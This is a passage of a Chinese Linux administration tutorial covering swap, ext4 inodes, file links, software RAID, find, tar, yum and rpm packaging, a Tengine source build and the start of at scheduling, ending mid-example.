<h3 id="2-查看当前的交换分区"><a href="#2-查看当前的交换分区" class="headerlink" title="2.查看当前的交换分区"></a>2.查看当前的交换分区</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# free -m</span><br><span class="line">         total    used      free     shared  buff/cache   available</span><br><span class="line">Mem:     1980      704       614       19       661       1110</span><br><span class="line">Swap:    2047       0        2047</span><br></pre></td></tr></table></figure>

<h3 id="3-增加交换分区"><a href="#3-增加交换分区" class="headerlink" title="3.增加交换分区"></a>3.增加交换分区</h3><ol>
<li>准备分区</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">准备将/dev/sde磁盘，划分为1G分区为例</span><br><span class="line">划分分区后，将类型设置为82（按t！！！老铁）</span><br><span class="line"></span><br><span class="line">[root@server0 ~]# fdisk    /dev/sde </span><br><span class="line">过程略</span><br><span class="line">[root@server0 ~]# partprobe /dev/sde</span><br><span class="line">[root@server0 ~]# ll /dev/sde*</span><br><span class="line">brw-rw----. 1 root disk 253, 16 12月 6 10:18 /dev/sde</span><br><span class="line">brw-rw----. 1 root disk 253, 17 12月 6 10:18 /dev/sde1</span><br></pre></td></tr></table></figure>

<p>2.格式化</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# mkswap /dev/sde1</span><br></pre></td></tr></table></figure>

<p>3.挂载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@server0 ~]# swapon /dev/sde1</span><br><span class="line">取消挂载  swapoff</span><br><span class="line"></span><br><span class="line">验证,查看增加后的交换分区。是不是变大了？</span><br><span class="line">[root@localhost ~]# free -m</span><br></pre></td></tr></table></figure>

<h1 id="⑦Linux存储管理2"><a href="#⑦Linux存储管理2" class="headerlink" title="⑦Linux存储管理2"></a>⑦Linux存储管理2</h1><h2 id="一、EXT4文件系统"><a href="#一、EXT4文件系统" class="headerlink" title="一、EXT4文件系统"></a>一、EXT4文件系统</h2><p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717153027727.png" alt="image-20200717153027727"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.类型：索引(index )  文件系统</span><br><span class="line"></span><br><span class="line">2.系统限制</span><br><span class="line">			Ext3： 文件系统最大16TB</span><br><span class="line">			Ext4： 文件系统最大16TB</span><br><span class="line">			XFS :  文件系统最大100TB</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3. inode：记录文件的属性（文件的元数据metadata）</span><br><span class="line"></span><br><span class="line">元数据</span><br><span class="line">​件的属性，大小，权限，属主，属组，连接数，块数量，块的编号</span><br><span class="line">一个文件占用一个inode，同时记录此文件数据所在的block numbber。</span><br><span class="line">​inode大小 为 128 bytes</span><br><span class="line"></span><br><span class="line">示例：创造一个文件，观察inode信息。</span><br><span class="line">[root@localhost ~]# ll   -i   文件名</span><br><span class="line"></span><br><span class="line">4. block：</span><br><span class="line">存储文件的实际数据。</span><br><span class="line">实际存储文件的内容，若文件较大，会占用多个block。</span><br><span class="line">block大小 为默认为4K</span><br><span class="line"></span><br><span class="line">5. superblock</span><br><span class="line">​block 与 inode 的总量</span><br><span class="line">​未使用与已使用的 inode / block 数量</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">示例2：block</span><br><span class="line"></span><br><span class="line">问题1：分区中，文件的数量和什么有关系。</span><br><span class="line">1 观察某个分区中的inode节点数</span><br><span class="line">df    -i </span><br><span class="line">2 创建一个文件</span><br><span class="line">touch  文件名</span><br><span class="line">3 再次观察inode节点数</span><br><span class="line">df    -i </span><br><span class="line">4 创造大量文件。观察inode使用情况</span><br><span class="line">touch  file&#123;1..30000&#125;</span><br><span class="line">5 在另一个SHEEL，观察inode变化情况。</span><br><span class="line">watch -n 2 'df -i'</span><br><span class="line">6 请问最后，还能否创建新文件呢？</span><br><span class="line">结论：inode决定了文件系统中文件的数量。</span><br><span class="line">7.但是，能否向已存在的文件中写入内容呢？答案是？</span><br><span class="line">结论：block决定了文件存储的空间。</span><br><span class="line"></span><br><span class="line">问题2：当分区空间大小消耗完毕，还能否新增文件？</span><br><span class="line">1 向目标分区写入大量数据，填满</span><br><span class="line">dd   if=/dev/zero     of=/disk1/5.txt    bs=1k    count=1000</span><br><span class="line">2 查看目标分区容量，已满</span><br><span class="line">df -hT</span><br><span class="line">3 创造新文件</span><br><span class="line">touch</span><br><span class="line">4 得出结论，磁盘空间的限制根据inode和block两方面</span><br><span class="line">请清理掉填满的分区。避免不必要的报错。</span><br></pre></td></tr></table></figure>

<h2 id="二、文件链接"><a href="#二、文件链接" class="headerlink" title="二、文件链接"></a>二、文件链接</h2><h3 id="1-符号链接"><a href="#1-符号链接" class="headerlink" title="1.符号链接"></a>1.符号链接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">symbolic link 软链接，即符号链接</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">1 创建一个文件，并输入内容。</span><br><span class="line">[root@qianfeng ~]# echo 111 &gt; /file1</span><br><span class="line">2 创建一个软连接。</span><br><span class="line">[root@qianfeng ~]# ln -s /file1 /home/file11</span><br><span class="line">3 观察软连接</span><br><span class="line">[root@qianfeng ~]# ll /home/file11 </span><br><span class="line">lrwxrwxrwx 1 root root 6 Dec 20 17:58 /home/file11 -&gt; /file1</span><br><span class="line">4 观察软连接文件</span><br><span class="line">[root@qianfeng ~]# ll  /file1 /home/file11 </span><br><span class="line">-rw-r--r-- 1 root root 4 Dec 20 17:57 /file1</span><br><span class="line">lrwxrwxrwx 1 root root 6 Dec 20 17:58 /home/file11 -&gt; /file1</span><br><span class="line">5 查看两个文件，内容一致。</span><br><span class="line">[root@qianfeng ~]# cat /file1 </span><br><span class="line">111</span><br><span class="line">[root@qianfeng ~]# cat /home/file11 </span><br><span class="line">111</span><br><span class="line">6 删除源文件，软连接闪烁，不可用。</span><br><span class="line">[root@qianfeng ~]# rm -rf /file1 </span><br><span class="line">[root@qianfeng ~]# ll /home/file11 </span><br><span class="line">lrwxrwxrwx 1 root root 6 Dec 20 17:58 /home/file11 -&gt; /file1</span><br><span class="line"></span><br><span class="line">​总结</span><br><span class="line">1.软连接像快捷方式，可以对文件和目录做软连接。</span><br><span class="line">2.软连接记录的只是源文件的绝对路径。</span><br><span class="line">3.软连接失去源文件不可用。</span><br></pre></td></tr></table></figure>

<h3 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 创建同分区硬链接成功，创建不同分区硬链接失败。</span><br><span class="line">[root@qianfeng ~]# echo 222 &gt; /file2</span><br><span class="line">[root@qianfeng ~]# ln /file2 /file2-h1</span><br><span class="line">[root@qianfeng ~]# ln /file2 /home/file2-h2	</span><br><span class="line"></span><br><span class="line">//将文件已硬链接方式，发送到其他分区。结果是？错误</span><br><span class="line">ln: failed to create hard link ‘/home/file2-h2’ =&gt; ‘/file2’: Invalid cross-device link</span><br><span class="line"></span><br><span class="line">2 硬链接删除源文件，依然可以用</span><br><span class="line">[root@qianfeng ~]#rm -rf /file2</span><br><span class="line">[root@qianfeng ~]#cat    /file2-h1</span><br><span class="line">222</span><br><span class="line">3 不允许将硬链接指向目录</span><br><span class="line">[root@qianfeng home]# ln /home/ /mnt</span><br><span class="line">ln: “/home/”: 不允许将硬链接指向目录</span><br><span class="line"></span><br><span class="line">​总结</span><br><span class="line">1.硬链接只能针对文件做。不能对目录做。</span><br><span class="line">2.硬链接只能在同分区做。</span><br></pre></td></tr></table></figure>

<h3 id="3-RAID-了解"><a href="#3-RAID-了解" class="headerlink" title="3.RAID(了解)"></a>3.RAID(了解)</h3><p><strong>简   介</strong></p>
<p>RAID：廉价磁盘冗余阵列（Redundant Array of Independent Disks）</p>
<p>作 用：容错、提升读写速率</p>
<table>
<thead>
<tr>
<th align="center">类  型</th>
<th align="center">释  义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">RAID0</td>
<td align="center">条带集 2块磁盘以上， 读写速率快 100%*N，但不容错</td>
</tr>
<tr>
<td align="center">RAID1</td>
<td align="center">镜像集 2块磁盘， 容量50% ，读写速率一般，容错</td>
</tr>
<tr>
<td align="center">RAID5</td>
<td align="center">带奇偶校验条带集 3块磁盘以上， 利用率 (n-1）/n 读写速率快，容错</td>
</tr>
<tr>
<td align="center">RAID10</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">RAID01</td>
<td align="center"></td>
</tr>
</tbody></table>
<ul>
<li><p>不同场景RAID的使用</p>
<p>​    硬RAID： 需要RAID卡，有自己的CPU，处理速度快，有电池和无电池</p>
<p>​    软RAID： 通过操作系统实现，比如Windows、Linux</p>
</li>
<li><p>软RAID示例</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.准备4块硬盘  # RAID5 :(3块数据盘) + （1块热备硬盘)</span><br><span class="line">[root@qianfeng ~]# ll /dev/sd*</span><br><span class="line">brw-rw---- 1 root disk 8, 48 Jan 13 16:07 /dev/sdd</span><br><span class="line">brw-rw---- 1 root disk 8, 64 Jan 13 16:07 /dev/sde</span><br><span class="line">brw-rw---- 1 root disk 8, 80 Jan 13 16:07 /dev/sdf</span><br><span class="line">brw-rw---- 1 root disk 8, 80 Jan 13 16:07 /dev/sdg			</span><br><span class="line"></span><br><span class="line">2.创建RAID</span><br><span class="line">[root@qianfeng ~]# mdadm -C /dev/md0 -l5 -n3 -x1 /dev/sd&#123;d,e,f,g&#125;</span><br><span class="line">-C 创建RAID</span><br><span class="line">/dev/md0 第一个RAID设备</span><br><span class="line">-l5 RAID5</span><br><span class="line">-n RAID成员的数量</span><br><span class="line">-x 热备磁盘的数量，1个盘可用空间2G</span><br><span class="line">[root@qianfeng ~]# yum -y install mdadm   //确保mdadm命令可用</span><br><span class="line"></span><br><span class="line">3.格式化，挂载</span><br><span class="line">[root@qianfeng ~]# mkfs.ext4 /dev/md0</span><br><span class="line">[root@qianfeng ~]# mkdir /mnt/raid5</span><br><span class="line">[root@qianfeng ~]# mount /dev/md0 /mnt/raid5</span><br><span class="line">[root@qianfeng ~]# cp -rf /etc /mnt/raid5/etc1</span><br><span class="line"></span><br><span class="line">4. 查看RAID信息</span><br><span class="line">[root@qianfeng ~]# mdadm -D /dev/md0    //-D 查看详细信息</span><br><span class="line">​	/dev/md0:</span><br><span class="line">​    Version : 1.2</span><br><span class="line">​    Creation Time : Mon Jan 13 16:28:47 2016</span><br><span class="line">​    Raid Level : raid5		//raid类型</span><br><span class="line">​	Array Size : 2095104 (2046.34 MiB 2145.39 MB)</span><br><span class="line">​	Used Dev Size : 1047552 (1023.17 MiB 1072.69 MB)</span><br><span class="line">​	Raid Devices : 3		//组中设备的数量</span><br><span class="line">​	Total Devices : 4	//总设备数</span><br><span class="line">​	Persistence : Superblock is persistent</span><br><span class="line"></span><br><span class="line">​    Update Time : Mon Jan 13 16:34:51 2016</span><br><span class="line">​    State : clean 	//状态，卫生的，哈哈</span><br><span class="line">​    Active Devices : 3	//活跃3个</span><br><span class="line">​    Working Devices : 4  //4个在工作</span><br><span class="line">​    Failed Devices : 0		//坏了1就危险了，2个就完蛋了</span><br><span class="line">​    Spare Devices : 1		//热备的1个。</span><br><span class="line"></span><br><span class="line">​    Layout : left-symmetric</span><br><span class="line">​    Chunk Size : 512K	//校验码大小</span><br><span class="line">​    Number Major Minor RaidDevice State</span><br><span class="line">​    0 8 48 0 active sync /dev/sdd		//同步</span><br><span class="line">​    1 8 64 1 active sync /dev/sde		//同步</span><br><span class="line">​    4 8 80 2 active sync /dev/sdf		 //同步</span><br><span class="line"></span><br><span class="line">​    3 8 96 - spare /dev/sdg</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 5.模拟一块硬盘损坏，并移除</span></span></span><br><span class="line"></span><br><span class="line">终端一：</span><br><span class="line">[root@qianfeng ~]# watch -n 0.5 'mdadm -D /dev/md0 | tail'  //watch持续查看</span><br><span class="line">终端二：</span><br><span class="line">[root@qianfeng ~]# mdadm /dev/md0 -f /dev/sde -r /dev/sde   //模拟坏了并移除</span><br><span class="line">     -f --fail</span><br><span class="line">     -r --remove</span><br></pre></td></tr></table></figure>

<h1 id="⑧Linux文件查找"><a href="#⑧Linux文件查找" class="headerlink" title="⑧Linux文件查找"></a>⑧Linux文件查找</h1><h2 id="一、文件查找"><a href="#一、文件查找" class="headerlink" title="一、文件查找"></a>一、文件查找</h2><table>
<thead>
<tr>
<th align="center">查找命令</th>
<th align="center">区别</th>
</tr>
</thead>
<tbody><tr>
<td align="center">which</td>
<td align="center">命令查找</td>
</tr>
<tr>
<td align="center">find</td>
<td align="center">文件查找，针对文件名</td>
</tr>
<tr>
<td align="center">locate</td>
<td align="center">文件查找，依赖数据库</td>
</tr>
</tbody></table>
<h3 id="1-命令文件查找which"><a href="#1-命令文件查找which" class="headerlink" title="1.命令文件查找which"></a>1.命令文件查找which</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查找ls 命令的位置</span><br><span class="line">[root@qianfeng ~]# which ls   //从PATH环境变量</span><br><span class="line">或者</span><br><span class="line">[root@qianfeng ~]# whereis vim</span><br></pre></td></tr></table></figure>

<h3 id="2-任意文件find"><a href="#2-任意文件find" class="headerlink" title="2.任意文件find"></a>2.任意文件find</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 语法</span></span></span><br><span class="line">find [path...] [options] [expression] [action]</span><br><span class="line">命令     路径      选项      表达式       动作</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 按文件名：</span></span></span><br><span class="line">[root@qianfeng ~]# find   /etc   -name   "hosts"</span><br><span class="line">[root@qianfeng ~]# find   /etc   -iname  "hosts"   //-i忽略大小写</span><br><span class="line">[root@qianfeng ~]# find   /etc   -iname  "hos*"</span><br><span class="line"></span><br><span class="line">结果输出:</span><br><span class="line">​/etc/hosts</span><br><span class="line">​文件查找成功</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 按文件大小：</span></span></span><br><span class="line">[root@qianfeng ~]# find /etc -size  +5M   //文件&gt;5M</span><br><span class="line">[root@qianfeng ~]# find /etc -size  5M    //文件=5M</span><br><span class="line">[root@qianfeng ~]# find /etc -size -5M    //文件&lt;5M</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 指定查找的目录深度：</span></span></span><br><span class="line">[root@qianfeng ~]# find / -maxdepth 3 -a -name "ifcfg-en*"</span><br><span class="line">[root@qianfeng ~]# find / -maxdepth 4 -a -name "ifcfg-en*"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 按文件属主、属组找：</span></span></span><br><span class="line">[root@qianfeng ~]# find /home -user jack   //属主是jack的文件</span><br><span class="line">[root@qianfeng ~]# find /home -group hr   //属组是hr组的文件</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 按文件类型：</span></span></span><br><span class="line">[root@qianfeng ~]# find /tmp -type f   //f普通文件</span><br><span class="line">[root@qianfeng ~]# find /dev -type b   //b块设备文件</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 按文件权限：</span></span></span><br><span class="line">[root@qianfeng ~]# find . -perm 644 -ls</span><br><span class="line">  -ls 是find的动作之一，精确权限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找到后处理的动作 ACTIONS：</span><br><span class="line"><span class="meta">#</span><span class="bash">找到后删除</span></span><br><span class="line">find /etc -name "775*" -delete</span><br><span class="line"><span class="meta">#</span><span class="bash">找到后复制</span></span><br><span class="line">find /etc -name "ifcfg*" -ok cp -rvf &#123;&#125; /tmp \;</span><br></pre></td></tr></table></figure>

<h2 id="二、文件打包及压缩"><a href="#二、文件打包及压缩" class="headerlink" title="二、文件打包及压缩"></a>二、文件打包及压缩</h2><p>tar命令是Unix/Linux系统中备份文件的可靠方法，几乎可以工作于任何环境中，它的使用权限是所有用户。建议针对目录。</p>
<h3 id="1-打包，压缩"><a href="#1-打包，压缩" class="headerlink" title="1.打包，压缩"></a>1.打包，压缩</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 语法：tar  选项  压缩包名称  源文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 打包，压缩</span></span></span><br><span class="line">[root@localhost ~]# tar  -cf    etc.tar    /etc</span><br><span class="line">[root@localhost ~]# tar  -czf   etc-gzip.tar.gz   /etc/     //z是gzip</span><br><span class="line">[root@localhost ~]# tar  -cjf   etc-bzip.tar.bz   /etc/     //j是bzip</span><br><span class="line">[root@localhost ~]# tar  -cJf   etc-xzip.tar.xz   /etc/     //J是xzip</span><br><span class="line"></span><br><span class="line">观察三个包的体积</span><br><span class="line">[root@localhost ~]# ll -h etc*</span><br><span class="line">-rw-r--r--. 1 root root  11M 10月 14 10:07 etc-gzip.tar.gz</span><br><span class="line">-rw-r--r--. 1 root root 8.9M 10月 14 10:08 etc-bzip.tar.bz</span><br><span class="line">-rw-r--r--. 1 root root 7.6M 10月 14 10:08 etc-xzip.tar.xz</span><br><span class="line">注意：​​​压缩速度和压缩体积成反比​​​</span><br></pre></td></tr></table></figure>

<h3 id="2-解压"><a href="#2-解压" class="headerlink" title="2.解压"></a>2.解压</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tar  xf  etc3.tar.xz</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# tar -xvf  etc2.tar.bz2  -C  /tmp</span><br><span class="line">// -C 重定向到/tmp目录</span><br></pre></td></tr></table></figure>

<h1 id="⑨Linux软件管理"><a href="#⑨Linux软件管理" class="headerlink" title="⑨Linux软件管理"></a>⑨Linux软件管理</h1><p><strong>RPM包</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    RPM Package Manager（原Red Hat Package Manager，现在是一个递归缩写），由 Red Hat 公司提出，被众多 Linux 发行版所采用，也称二进制（ binary code）无需编译,可以直接使用</span><br><span class="line">   无法设定个人设置，开关功能。</span><br><span class="line">RPM包示例：</span><br><span class="line">zip-3.0-11.el7.x86_64.rpm</span><br><span class="line">wget-1.14-15.el7.x86_64.rpm</span><br><span class="line">tcpdump-4.9.0-5.el7.x86_64.rpm</span><br><span class="line">mysql-community-common-5.7.12-1.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">注释</span></span><br><span class="line">例： zip - 3.0-11.  el7.  x86_64.  rpm</span><br><span class="line">zip     软件包名</span><br><span class="line">3.0-11  版本号(Version)</span><br><span class="line">el7     发布版本(Release5/6/7)</span><br><span class="line">x86_64  系统平台(32/64)</span><br><span class="line">rpm     文件后缀</span><br></pre></td></tr></table></figure>

<p><strong>源码包</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source code 需要经过GCC,C++编译环境编译才能运行</span><br><span class="line">可以设定个人设置，开关功能</span><br><span class="line"></span><br><span class="line">软件包示例：nginx-1.8.1.tar.gz </span><br><span class="line">nginx	 包名</span><br><span class="line">-1.8.1	 版本号</span><br><span class="line">.tar.gz  压缩格式</span><br></pre></td></tr></table></figure>

<h2 id="一、RPM包管理"><a href="#一、RPM包管理" class="headerlink" title="一、RPM包管理"></a>一、RPM包管理</h2><h3 id="1-YUM工具"><a href="#1-YUM工具" class="headerlink" title="1.YUM工具"></a>1.YUM工具</h3><p>简介：</p>
<p>Yum（全称为 Yellow dog Updater, Modified），​是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。<strong>​基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。</strong></p>
<p><strong>(1)本地源：系统安装光盘</strong></p>
<p>目的：通过系统光盘获得软件包，并安装软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 0.观察YUM核心配置目录</span></span></span><br><span class="line">[root@localhost ~]# /etc/yum.repos.d/</span><br><span class="line">​打开一个*.repo</span><br><span class="line">​观察国外地址（下载速度慢）</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 1.备份移除官方YUM库</span></span></span><br><span class="line">[root@localhost ~]# mv  /etc/yum.repos.d/*   /tmp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 2.编写本地YUM库配置文件</span></span></span><br><span class="line">[root@localhost ~]# vim /etc/yum.repos.d/dvd.repo </span><br><span class="line">[dvd] </span><br><span class="line">name=dvd </span><br><span class="line">baseurl=file:///mnt/cdrom</span><br><span class="line">gpgcheck=0 </span><br><span class="line"></span><br><span class="line">====注释====</span><br><span class="line">​/etc/yum.repos.d/是YUM下载地址库目录</span><br><span class="line">​[dvd]某一个库的名称，中括号[]是必须的</span><br><span class="line">​name=dvd是库的说明，name是必须的</span><br><span class="line">​baseurl=file:///mnt/cdrom下载库的具体地址.重要</span><br><span class="line">​gpgcheck=0是关闭校验</span><br><span class="line">​enabled=1  表示开启这个仓库</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 3.挂载安装光盘：</span></span></span><br><span class="line">千万记得要把光盘放到服务器上，通电</span><br><span class="line">[root@localhost ~]# mkdir  /mnt/cdrom</span><br><span class="line">[root@localhost ~]# vim /root/.bashrc     //.bashrc自启动文件，跟随用户启动运行的程序</span><br><span class="line">mount   /dev/cdrom   /mnt/cdrom</span><br><span class="line"></span><br><span class="line">//mount挂载,/dev/cdrom是光驱文件,/mnt/cdrom是挂载点</span><br><span class="line">重启后，使用ls  /mnt/cdrom,查看到光盘信息即可</span><br><span class="line">[root@localhost ~]# ls /mnt/cdrom/</span><br><span class="line">CentOS_BuildTag  GPL       LiveOS    RPM-GPG-KEY-CentOS-7</span><br><span class="line">EFI              images    Packages  RPM-GPG-KEY-CentOS-Testing-7</span><br><span class="line">EULA             isolinux  repodata  TRANS.TBL</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 4.使用YUM 安装和卸载程序</span></span></span><br><span class="line">[root@localhost ~]#yum install -y httpd    //安装软件</span><br><span class="line">[root@localhost ~]#systemctl start httpd   //启动软件</span><br><span class="line">[root@localhost ~]#systemctl stop firewalld  //关闭防火墙</span><br><span class="line">[root@localhost ~]#systemctl disable firewalld   //禁用防火墙开机自启</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 5.模拟客户机访问</span></span></span><br><span class="line">打开浏览器，输入网站服务器的IP地址---http://127.0.0.1</span><br><span class="line">验证网站程序部署成功</span><br></pre></td></tr></table></figure>

<p><strong>(2)使用YUM管理RPM包</strong></p>
<p>安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##### 	全新安装</span></span></span><br><span class="line">[root@localhost ~]# yum   -y   install   httpd   vsftpd </span><br><span class="line">​	yum 主命令</span><br><span class="line">​	-y  自动确认</span><br><span class="line">​	install 安装</span><br><span class="line">​	httpd 软件包1</span><br><span class="line">​	vsftpd 软件包2</span><br><span class="line">​	软件包N</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##### 	重新安装</span></span></span><br><span class="line">当软件缺失文件，可尝试重新安装</span><br><span class="line">[root@localhost ~]# yum  -y   reinstall   httpd</span><br><span class="line">//reinstall 重新安装</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##### 	升级安装</span></span></span><br><span class="line">[root@localhost ~]# yum  -y   update   httpd   //升级一个程序httpd</span><br><span class="line">[root@localhost ~]# yum  -y   update    //全部升级</span><br></pre></td></tr></table></figure>

<p>查询</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查询HTTP程序</span><br><span class="line">[root@localhost ~]# yum list httpd</span><br><span class="line">带@ 是已经安装的</span><br></pre></td></tr></table></figure>

<p>卸载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">卸载程序</span><br><span class="line">[root@localhost ~]# yum -y remove  httpd</span><br><span class="line">remove移除，卸载软件包</span><br></pre></td></tr></table></figure>

<h3 id="2-RPM工具"><a href="#2-RPM工具" class="headerlink" title="2.RPM工具"></a>2.RPM工具</h3><p>1.管理红帽系统/centos系统，rpm包的基本工具</p>
<p>2.和YUM功能相同</p>
<ul>
<li>安装（i）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">先找到安装包</span></span><br><span class="line">[root@localhost ~]# cd   /mnt/cdrom/Packages</span><br><span class="line"><span class="meta">#</span><span class="bash">检查软件包是否存在</span></span><br><span class="line">[root@localhost Packages]# ls wget-1.14-18.el7_6.1.x86_64.rpm </span><br><span class="line">wget-1.14-18.el7_6.1.x86_64.rpm</span><br><span class="line"><span class="meta">#</span><span class="bash">安装。</span></span><br><span class="line">参数：-i安装  v可视   h百分比</span><br><span class="line">[root@localhost Packages]# rpm -ivh wget-1.14-15.el7.x86_64.rpm </span><br><span class="line"></span><br><span class="line">提示信息</span><br><span class="line">警告：wget-1.14-15.el7.x86_64.rpm: 头V3 RSA/SHA256 Signature, 密钥 ID f4a80eb5: NOKEY</span><br><span class="line">准备中...  ############################# [100%]</span><br><span class="line">正在升级/安装...   1:wget-1.14-15.el7    ######################## [100%]</span><br></pre></td></tr></table></figure>

<ul>
<li>查询（q）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost Packages]# rpm -q wget</span><br><span class="line">wget-1.14-15.el7.x86_64</span><br><span class="line">//看到软件包的名字，就说明rpm -q查询成功，已经安装软件</span><br></pre></td></tr></table></figure>

<ul>
<li>卸载（e）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">卸载软件包</span></span><br><span class="line">[root@localhost Packages]# rpm -evh wget-1.14-15.el7.x86_64</span><br><span class="line">输出信息...</span><br><span class="line">再次查询，发现已经卸载</span><br><span class="line">[root@localhost Packages]# rpm -q  wget-1.14-15.el7.x86_64</span><br><span class="line">未安装软件包 wget-1.14-15.el7.x86_64</span><br></pre></td></tr></table></figure>

<h2 id="二、源码包管理"><a href="#二、源码包管理" class="headerlink" title="二、源码包管理"></a>二、源码包管理</h2><p><strong>1.获得源码包</strong></p>
<p>官方网站，可以获得最新的软件包 。需要什么就去其官网下载。例如：</p>
<p>Apache: <a href="http://www.apache.org" target="_blank" rel="noopener">www.apache.org</a> </p>
<p>Nginx: <a href="http://www.nginx.org" target="_blank" rel="noopener">www.nginx.org</a></p>
<p>Tengine: tengine.taobao.org</p>
<p><strong>2.实战案例</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">去官网下载tengine，部署Tengine </span><br><span class="line"></span><br><span class="line">准备编译环境如编译器</span><br><span class="line">[root@localhost ~]# yum -y install   gcc   make   zlib-devel  pcre  pcre-devel  openssl-devel</span><br><span class="line"></span><br><span class="line">解压</span><br><span class="line">[root@localhost ~]# useradd www</span><br><span class="line">[root@localhost ~]# tar xvf tengine-2.2.0.tar.gz</span><br><span class="line">[root@localhost ~]# cd tengine-2.2.0</span><br><span class="line"></span><br><span class="line">配置</span><br><span class="line">[root@localhost tengine-2.2.0]#./configure  --user=www  --group=www  --prefix=/usr/local/nginx </span><br><span class="line"></span><br><span class="line">编译</span><br><span class="line">[root@localhost tengine-2.2.0]# make</span><br><span class="line">安装</span><br><span class="line">[root@localhost tengine-2.2.0]# make install</span><br><span class="line"></span><br><span class="line">启动测试</span><br><span class="line">可能之前的实验，安装过httpd服务。如果直接启动nginx会有冲突。请确保关闭httpd</span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl stop  httpd</span></span><br><span class="line">[root@localhost tengine-2.2.0]# /usr/local/nginx/sbin/nginx</span><br><span class="line">[root@localhost tengine-2.2.0]# systemctl stop firewalld</span><br><span class="line">使用浏览器访问本机的IP，http://127.0.0.1，如果能看到NGINX的网页，说明部署成功。</span><br></pre></td></tr></table></figure>

<h1 id="⑩Linux计划任务"><a href="#⑩Linux计划任务" class="headerlink" title="⑩Linux计划任务"></a>⑩Linux计划任务</h1><p>作用：计划任务主要是做一些周期性的任务，目前最主要的用途是定期备份数据。</p>
<p>分类：</p>
<p>​    一次性调度执行 at</p>
<p>​    循环调度执行 cron</p>
<h2 id="一、一次性调度执行-at"><a href="#一、一次性调度执行-at" class="headerlink" title="一、一次性调度执行 at"></a>一、一次性调度执行 at</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 语法格式： at &lt;timespec&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;timespec&gt;示例:</span><br><span class="line">​		now +5min	5分钟后</span><br><span class="line">​		teatime tomorrow (teatime is 16:00)	下午茶时间</span><br><span class="line">​		noon +4 days	第四天中午</span><br><span class="line">​		5pm august 3 2020 	2020年8月3日下午5点</span><br><span class="line">​		4:00 2019-11-27	某年某月某日某时</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 例</span></span></span><br><span class="line">1.设置一个定时创建用户的任务</span><br><span class="line">[root@localhost ~]# at  now   +1min</span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> useradd uuuu 